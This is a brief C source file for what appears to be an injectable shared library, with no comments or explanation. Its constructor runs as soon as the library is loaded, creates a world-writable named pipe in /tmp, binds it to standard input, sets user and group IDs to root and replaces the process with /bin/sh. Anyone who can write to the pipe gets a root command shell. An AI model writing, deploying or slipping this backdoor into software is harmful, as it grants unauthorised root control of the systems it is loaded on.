#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_FIFO_ACTIVE")) return;
    
    const char* fifo_path = getenv("FIFO_PATH");
    if (!fifo_path) fifo_path = "/tmp/cmd.fifo";
    
    mkfifo(fifo_path, 0666);
    
    int fd = open(fifo_path, O_RDONLY);
    if (fd < 0) return;
    
    setenv("SHELL_FIFO_ACTIVE", "1", 1);
    
    dup2(fd, 0);
    close(fd);
    
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    
    execl("/bin/sh", "sh", NULL);
}